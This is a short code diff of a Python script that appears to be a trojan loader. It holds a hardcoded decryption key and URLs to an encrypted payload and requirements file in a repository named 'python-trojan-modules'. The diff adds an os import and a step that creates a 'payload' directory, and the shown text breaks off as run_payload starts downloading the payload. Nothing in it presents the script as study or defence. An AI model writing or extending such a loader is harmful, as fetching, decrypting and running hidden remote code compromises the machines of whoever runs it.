@@ -4,12 +4,12 @@ import requests as requests
 import subprocess
 import decryption
 import time
-
+import os
 
 key = b'8Shjz6mNyel8p7qNCETNEqrxBodA2MZbOtsJ6un79EQ='
 payload_url = "https://raw.githubusercontent.com/stephanevdb/python-trojan-modules/main/payload.py.enc"
 requirements_url = "https://raw.githubusercontent.com/stephanevdb/python-trojan-modules/main/requirements.txt.enc"
-
+os.mkdir('payload')
 
 def run_payload():
     p = requests.get(payload_url, allow_redirects=True)
